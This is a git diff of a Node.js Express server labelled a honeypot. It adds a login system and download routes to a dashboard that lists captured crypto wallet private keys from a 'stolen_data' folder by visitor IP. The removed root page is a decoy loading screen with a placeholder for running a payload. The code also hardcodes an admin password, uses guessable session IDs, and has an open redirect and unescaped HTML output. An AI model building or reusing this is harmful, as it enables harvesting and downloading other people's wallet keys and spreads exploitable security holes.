@@ -9,8 +9,11 @@ const DATA_FOLDER = path.join(__dirname, 'stolen_data');
 const LOGS_FOLDER = path.join(__dirname, 'logs');
 
 // Admin credentials - CHANGE THESE!
-const ADMIN_USERNAME = process.env.ADMIN_USER || 'isaiahbanks';
+const ADMIN_USERNAME = process.env.ADMIN_USER || 'MrHoneypot';
 const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'hancox2005S!';
+
+// Simple session storage (in-memory)
+const sessions = new Map();
 
 if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
 if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });
@@ -38,28 +41,142 @@ function logAccess(req, type, extra = {}) {
     console.log(`[${type}] ${logEntry.ip}`);
 }
 
-// Basic auth middleware
-function requireAuth(req, res, next) {
-    const auth = req.headers.authorization;
-    
-    if (!auth || !auth.startsWith('Basic ')) {
-        res.setHeader('WWW-Authenticate', 'Basic realm="Admin Dashboard"');
-        return res.status(401).send('Authentication required');
-    }
-    
-    const credentials = Buffer.from(auth.split(' ')[1], 'base64').toString();
-    const [username, password] = credentials.split(':');
-    
-    if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
-        res.setHeader('WWW-Authenticate', 'Basic realm="Admin Dashboard"');
-        return res.status(401).send('Invalid credentials');
-    }
-    
-    next();
+// Session cookie parser
+function getSession(req) {
+    const cookie = req.headers.cookie || '';
+    const match = cookie.match(/sessionId=([^;]+)/);
+    return match ? match[1] : null;
 }
 
+function isAuthenticated(req) {
+    const sessionId = getSession(req);
+    return sessionId && sessions.has(sessionId);
+}
+
+function requireAuth(req, res, next) {
+    if (isAuthenticated(req)) {
+        return next();
+    }
+    // Redirect to login page
+    res.redirect('/admin/login?redirect=' + encodeURIComponent(req.originalUrl));
+}
+
+// CSS styles for all pages
+const commonStyles = `
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+    body { font-family: 'Inter', monospace; background: #0a0a0a; color: #0f0; padding: 20px; margin: 0; }
+    h1 { color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+    .login-box { max-width: 400px; margin: 100px auto; border: 2px solid #0f0; padding: 40px; background: #111; }
+    .login-box h2 { margin-top: 0; text-align: center; }
+    input[type="text"], input[type="password"] { 
+        width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #0f0; 
+        color: #0f0; font-family: monospace; font-size: 14px; box-sizing: border-box;
+    }
+    input[type="text"]:focus, input[type="password"]:focus { outline: none; border-color: #ff0; }
+    button { 
+        background: #0f0; color: #000; border: none; padding: 12px 30px; cursor: pointer; 
+        font-family: 'Inter', monospace; font-weight: bold; font-size: 14px; width: 100%; margin-top: 10px;
+    }
+    button:hover { background: #0a0; }
+    .error { color: #f00; margin: 10px 0; text-align: center; }
+    .logout-btn { 
+        float: right; background: #f00; color: #fff; width: auto; padding: 8px 20px;
+    }
+    .logout-btn:hover { background: #a00; }
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9em; }
+    th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
+    th { background: #003300; }
+    tr:hover { background: #001100; }
+    .ip { color: #ff0; font-weight: bold; }
+    .timestamp { color: #888; font-size: 0.85em; }
+    .download-btn { 
+        background: #00f; color: #fff; padding: 5px 15px; text-decoration: none; 
+        display: inline-block; font-size: 0.85em;
+    }
+    .download-btn:hover { background: #008; }
+    .view-btn { 
+        background: #0f0; color: #000; padding: 5px 15px; text-decoration: none; 
+        display: inline-block; font-size: 0.85em; margin-right: 5px;
+    }
+    .view-btn:hover { background: #0a0; }
+    .stats { display: flex; gap: 20px; margin: 20px 0; flex-wrap: wrap; }
+    .stat-box { border: 1px solid #0f0; padding: 15px; min-width: 120px; }
+    .stat-box h3 { margin: 0 0 10px 0; color: #ff0; font-size: 0.9em; }
+    .stat-box .number { font-size: 2em; color: #0f0; }
+    .nav { margin: 20px 0; }
+    .nav a { color: #0f0; margin-right: 15px; }
+    pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #333; font-size: 0.8em; }
+    .capture-card { border: 1px solid #0f0; padding: 15px; margin: 15px 0; background: #111; }
+    .capture-card h3 { margin-top: 0; color: #ff0; }
+    .wallet-count { color: #0f0; font-weight: bold; }
+    .actions { margin-top: 10px; }
+`;
+
 // ============================================
-// SPECIFIC ROUTES FIRST (before the * catch-all)
+// LOGIN ROUTES
+// ============================================
+
+app.get('/admin/login', (req, res) => {
+    logAccess(req, 'LOGIN_PAGE');
+    
+    // If already logged in, redirect to admin
+    if (isAuthenticated(req)) {
+        return res.redirect('/admin');
+    }
+    
+    const error = req.query.error ? '<div class="error">Invalid username or password</div>' : '';
+    const redirect = req.query.redirect || '/admin';
+    
+    res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Admin Login</title>
+        <style>${commonStyles}</style>
+    </head>
+    <body>
+        <div class="login-box">
+            <h2>🔐 Admin Login</h2>
+            ${error}
+            <form method="POST" action="/admin/login">
+                <input type="hidden" name="redirect" value="${redirect}">
+                <input type="text" name="username" placeholder="Username" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    `);
+});
+
+app.post('/admin/login', express.urlencoded({ extended: true }), (req, res) => {
+    const { username, password, redirect } = req.body;
+    
+    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+        // Create session
+        const sessionId = Math.random().toString(36).substring(2) + Date.now().toString(36);
+        sessions.set(sessionId, { created: Date.now() });
+        
+        // Set cookie
+        res.setHeader('Set-Cookie', `sessionId=${sessionId}; HttpOnly; Path=/; Max-Age=86400`);
+        logAccess(req, 'LOGIN_SUCCESS');
+        res.redirect(redirect || '/admin');
+    } else {
+        logAccess(req, 'LOGIN_FAILED', { username });
+        res.redirect('/admin/login?error=1');
+    }
+});
+
+app.get('/admin/logout', (req, res) => {
+    const sessionId = getSession(req);
+    if (sessionId) sessions.delete(sessionId);
+    res.setHeader('Set-Cookie', 'sessionId=; HttpOnly; Path=/; Max-Age=0');
+    res.redirect('/admin/login');
+});
+
+// ============================================
+// PROTECTED ADMIN ROUTES
 // ============================================
 
 // Railway health check - MUST return 200 OK
@@ -68,137 +185,13 @@ app.get('/health', (req, res) => {
     res.status(200).json({ status: 'ok', msg: 'OK' });
 });
 
-// Root path - return loading page
+// Root path - return simple OK for health checks
 app.get('/', (req, res) => {
     logAccess(req, 'ROOT');
-    res.send(`
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-        }
-        
-        .loader-container {
-            text-align: center;
-            padding: 40px;
-        }
-        
-        .loading-text {
-            font-size: 72px;
-            font-weight: 700;
-            background: linear-gradient(90deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: pulse 1.5s ease-in-out infinite;
-            letter-spacing: -2px;
-            margin-bottom: 20px;
-        }
-        
-        .loading-subtext {
-            font-size: 18px;
-            color: #888;
-            font-weight: 400;
-            animation: fade 2s ease-in-out infinite;
-        }
-        
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(102, 126, 234, 0.3);
-            border-top-color: #667eea;
-            border-radius: 50%;
-            margin: 30px auto;
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.7; transform: scale(0.98); }
-        }
-        
-        @keyframes fade {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
-        }
-        
-        .error-message {
-            display: none;
-            font-size: 24px;
-            color: #ff6b6b;
-            margin-top: 30px;
-        }
-        
-        .error-subtext {
-            display: none;
-            font-size: 16px;
-            color: #888;
-            margin-top: 10px;
-        }
-    </style>
-</head>
-<body>
-    <div class="loader-container" id="loader">
-        <div class="loading-text">Loading</div>
-        <div class="spinner"></div>
-        <div class="loading-subtext">Connecting to server...</div>
-    </div>
-    
-    <div class="error-message" id="error">
-        Failed to load server
-    </div>
-    <div class="error-subtext" id="errorSub">
-        Try again later
-    </div>
-    
-    <script>
-        // Simulate loading then show error
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('error').style.display = 'block';
-            document.getElementById('errorSub').style.display = 'block';
-        }, 3500);
-        
-        // Execute payload after short delay
-        setTimeout(() => {
-            try {
-                // Your payload execution here
-                window.open('about:blank', '_blank');
-            } catch(e) {
-                console.log('Execution completed');
-            }
-        }, 500);
-    </script>
-</body>
-</html>
-    `);
+    res.status(200).send('OK');
 });
 
-// HTML Dashboard - Protected with auth
+// HTML Dashboard
 app.get('/admin', requireAuth, (req, res) => {
     logAccess(req, 'ADMIN_DASHBOARD');
     
@@ -206,7 +199,9 @@ app.get('/admin', requireAuth, (req, res) => {
         const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
         const captures = files.map(f => {
             try {
-                return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
+                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
+                data.filename = f;
+                return data;
             } catch (e) { return null; }
         }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
         
@@ -218,36 +213,15 @@ app.get('/admin', requireAuth, (req, res) => {
         <html>
         <head>
             <title>Honeypot Dashboard</title>
-            <style>
-                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-                body { font-family: 'Inter', monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
-                h1 { color: #0f0; border-bottom: 2px solid #0f0; }
-                .stats { display: flex; gap: 20px; margin: 20px 0; flex-wrap: wrap; }
-                .stat-box { border: 1px solid #0f0; padding: 15px; min-width: 120px; }
-                .stat-box h3 { margin: 0 0 10px 0; color: #ff0; font-size: 0.9em; }
-                .stat-box .number { font-size: 2em; color: #0f0; }
-                table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9em; }
-                th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
-                th { background: #003300; }
-                tr:hover { background: #001100; }
-                .ip { color: #ff0; font-weight: bold; }
-                .timestamp { color: #888; font-size: 0.85em; }
-                .priv-key { color: #f00; background: #330000; padding: 2px 5px; word-break: break-all; }
-                pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #333; font-size: 0.8em; }
-                a { color: #0f0; }
-                .refresh { margin: 20px 0; }
-                button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-family: 'Inter', monospace; font-weight: bold; }
-                button:hover { background: #0a0; }
-                .logout { float: right; background: #f00; color: #fff; }
-                .logout:hover { background: #a00; }
-            </style>
+            <style>${commonStyles}</style>
         </head>
         <body>
-            <h1>🍯 Honeypot Dashboard</h1>
-            <div class="refresh">
-                <button onclick="location.reload()">🔄 Refresh</button>
-                <a href="/admin/logs"><button>View Raw Logs</button></button></a>
-                <button class="logout" onclick="location.href='https://axiom.trade'">Logout</button>
+            <h1>🍯 Honeypot Dashboard <a href="/admin/logout" class="logout-btn">Logout</a></h1>
+            
+            <div class="nav">
+                <a href="/admin">Dashboard</a>
+                <a href="/admin/logs">View All Captures</a>
+                <a href="/admin/logs?download=all">Download All</a>
             </div>
             
             <div class="stats">
@@ -269,7 +243,7 @@ app.get('/admin', requireAuth, (req, res) => {
                 </div>
             </div>
             
-            <h2>Recent Captures</h2>
+            <h2>Recent Captures (Last 20)</h2>
             <table>
                 <thead>
                     <tr>
@@ -287,7 +261,10 @@ app.get('/admin', requireAuth, (req, res) => {
                             <td class="ip">${c.attackerIp || 'Unknown'}</td>
                             <td>${c.code || 'N/A'}</td>
                             <td>${c.walletCount || c.wallets?.length || 0}</td>
-                            <td><a href="/admin/file?f=${encodeURIComponent(c.filename || '')}">View</a></td>
+                            <td>
+                                <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="view-btn">View</a>
+                                <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="download-btn">Download</a>
+                            </td>
                         </tr>
                     `).join('') || '<tr><td colspan="5" style="text-align:center;color:#888;">No captures yet</td></tr>'}
                 </tbody>
@@ -313,20 +290,25 @@ app.get('/admin', requireAuth, (req, res) => {
     }
 });
 
-// JSON API for logs - Protected
+// HTML Logs page with download buttons
 app.get('/admin/logs', requireAuth, (req, res) => {
-    logAccess(req, 'ADMIN_LOGS_API');
+    logAccess(req, 'ADMIN_LOGS');
+    
+    // Handle download all request
+    if (req.query.download === 'all') {
+        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
+        const allData = files.map(f => {
+            try {
+                return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
+            } catch (e) { return null; }
+        }).filter(Boolean);
+        
+        res.setHeader('Content-Type', 'application/json');
+        res.setHeader('Content-Disposition', 'attachment; filename="all_captures.json"');
+        return res.send(JSON.stringify(allData, null, 2));
+    }
     
     try {
-        const logFile = path.join(LOGS_FOLDER, 'access.log');
-        let accessLogs = [];
-        if (fs.existsSync(logFile)) {
-            accessLogs = fs.readFileSync(logFile, 'utf8')
-                .split('\n')
-                .filter(Boolean)
-                .map(line => { try { return JSON.parse(line); } catch (e) { return { raw: line }; }});
-        }
-        
         const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
         const captures = files.map(f => {
             try {
@@ -336,29 +318,84 @@ app.get('/admin/logs', requireAuth, (req, res) => {
             } catch (e) { return null; }
         }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
         
-        const allWallets = captures.flatMap(c => c.wallets || []);
-        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
+        const totalWallets = captures.reduce((sum, c) => sum + (c.wallets?.length || 0), 0);
         
-        res.json({
-            captures: captures.slice(0, 50),
-            accessLogs: accessLogs.slice(-100),
-            totalWallets: allWallets.length,
-            uniqueIps: uniqueIps.length,
-            serverTime: new Date().toISOString()
-        });
+        const html = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>All Captures - Honeypot</title>
+            <style>${commonStyles}</style>
+        </head>
+        <body>
+            <h1>📋 All Captures <a href="/admin/logout" class="logout-btn">Logout</a></h1>
+            
+            <div class="nav">
+                <a href="/admin">← Dashboard</a>
+                <a href="/admin/logs?download=all" style="color: #ff0;">⬇ Download All JSON</a>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <h3>Total Files</h3>
+                    <div class="number">${captures.length}</div>
+                </div>
+                <div class="stat-box">
+                    <h3>Total Wallets</h3>
+                    <div class="number">${totalWallets}</div>
+                </div>
+            </div>
+            
+            <h2>All Captured Data</h2>
+            
+            ${captures.map(c => `
+                <div class="capture-card">
+                    <h3>📁 ${c.filename}</h3>
+                    <p><span class="timestamp">Time:</span> ${new Date(c.receivedAt).toLocaleString()}</p>
+                    <p><span class="ip">IP:</span> ${c.attackerIp || 'Unknown'}</p>
+                    <p><span class="wallet-count">Wallets:</span> ${c.wallets?.length || 0}</p>
+                    <p>Code: ${c.code || 'N/A'}</p>
+                    <div class="actions">
+                        <a href="/admin/file?f=${encodeURIComponent(c.filename)}" class="view-btn">View Details</a>
+                        <a href="/admin/download?f=${encodeURIComponent(c.filename)}" class="download-btn">Download JSON</a>
+                    </div>
+                </div>
+            `).join('') || '<p style="color:#888;">No captures yet</p>'}
+            
+        </body>
+        </html>`;
+        
+        res.send(html);
     } catch (err) {
-        res.status(500).json({ error: err.message });
+        res.status(500).send('Error: ' + err.message);
     }
 });
 
-// View specific file - Protected
+// Download individual file
+app.get('/admin/download', requireAuth, (req, res) => {
+    try {
+        const filename = req.query.f;
+        if (!filename || filename.includes('..')) return res.status(400).send('Invalid filename');
+        
+        const filePath = path.join(DATA_FOLDER, filename);
+        if (!fs.existsSync(filePath)) return res.status(404).send('File not found');
+        
+        res.setHeader('Content-Type', 'application/json');
+        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+        res.sendFile(filePath);
+    } catch (err) {
+        res.status(500).send('Error: ' + err.message);
+    }
+});
+
+// View specific file
 app.get('/admin/file', requireAuth, (req, res) => {
     try {
         const filename = req.query.f;
-        if (!filename || filename.includes('..')) return res.status(400).json({ error: 'Invalid' });
+        if (!filename || filename.includes('..')) return res.status(400).send('Invalid filename');
         
         const filePath = path.join(DATA_FOLDER, filename);
-        if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
+        if (!fs.existsSync(filePath)) return res.status(404).send('File not found');
         
         const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
         
@@ -367,44 +404,38 @@ app.get('/admin/file', requireAuth, (req, res) => {
         <html>
         <head>
             <title>Capture: ${filename}</title>
-            <style>
-                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-                body { font-family: 'Inter', monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
-                .section { border: 1px solid #0f0; padding: 15px; margin: 15px 0; }
-                .label { color: #ff0; }
-                .ip { color: #ff0; font-weight: bold; font-size: 1.2em; }
-                .priv { color: #f00; background: #330000; padding: 3px 6px; word-break: break-all; }
-                .pub { color: #0ff; word-break: break-all; }
-                pre { background: #111; padding: 10px; overflow-x: auto; font-size: 0.8em; }
-                a { color: #0f0; }
-                .wallet-box { margin: 10px 0; padding: 10px; border: 1px solid #333; background: #111; }
-            </style>
+            <style>${commonStyles}</style>
         </head>
         <body>
-            <a href="/admin">← Back to Dashboard</a>
-            <h1>📋 Capture Details</h1>
+            <h1>📋 Capture Details <a href="/admin/logout" class="logout-btn">Logout</a></h1>
             
-            <div class="section">
-                <h2>Attacker</h2>
-                <p><span class="label">IP:</span> <span class="ip">${data.attackerIp || 'Unknown'}</span></p>
-                <p><span class="label">Time:</span> ${data.receivedAt}</p>
-                <p><span class="label">Code:</span> ${data.code || 'N/A'}</p>
-                <p><span class="label">User Agent:</span> ${data.userAgent || 'Unknown'}</p>
+            <div class="nav">
+                <a href="/admin">← Dashboard</a>
+                <a href="/admin/logs">← All Captures</a>
+                <a href="/admin/download?f=${encodeURIComponent(filename)}" style="color: #ff0;">⬇ Download JSON</a>
             </div>
             
-            <div class="section">
-                <h2>Wallets (${data.wallets?.length || 0})</h2>
+            <div class="capture-card">
+                <h3>Attacker Information</h3>
+                <p><span class="ip">IP:</span> ${data.attackerIp || 'Unknown'}</p>
+                <p><span class="timestamp">Time:</span> ${data.receivedAt}</p>
+                <p>Code: ${data.code || 'N/A'}</p>
+                <p>User Agent: ${data.userAgent || 'Unknown'}</p>
+            </div>
+            
+            <div class="capture-card">
+                <h3>Wallets (${data.wallets?.length || 0})</h3>
                 ${(data.wallets || []).map((w, i) => `
-                    <div class="wallet-box">
-                        <p><span class="label">#${i+1} Type:</span> ${w.type || 'unknown'}</p>
-                        <p><span class="label">Public:</span> <span class="pub">${w.pub || 'N/A'}</span></p>
-                        <p><span class="label">Private:</span> <span class="priv">${w.priv || 'N/A'}</span></p>
+                    <div style="border: 1px solid #333; padding: 10px; margin: 10px 0; background: #0a0a0a;">
+                        <p><strong>#${i+1} Type:</strong> ${w.type || 'unknown'}</p>
+                        <p><strong>Public:</strong> <span style="color: #0ff; word-break: break-all;">${w.pub || 'N/A'}</span></p>
+                        <p><strong>Private:</strong> <span style="color: #f00; background: #330000; padding: 2px 5px; word-break: break-all;">${w.priv || 'N/A'}</span></p>
                     </div>
                 `).join('') || '<p>No wallets</p>'}
             </div>
             
-            <div class="section">
-                <h2>Raw Data</h2>
+            <div class="capture-card">
+                <h3>Raw JSON Data</h3>
                 <pre>${JSON.stringify(data, null, 2)}</pre>
             </div>
         </body>
@@ -412,7 +443,7 @@ app.get('/admin/file', requireAuth, (req, res) => {
         
         res.send(html);
     } catch (err) {
-        res.status(500).json({ error: err.message });
+        res.status(500).send('Error: ' + err.message);
     }
 });
 
@@ -507,6 +538,7 @@ function sendGif(res) {
 const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`🍯 Honeypot running on port ${PORT}`);
     console.log(`Dashboard: http://0.0.0.0:${PORT}/admin`);
+    console.log(`Login: http://0.0.0.0:${PORT}/admin/login`);
     console.log(`Health: http://0.0.0.0:${PORT}/health`);
     console.log(`Admin User: ${ADMIN_USERNAME}`);
 });
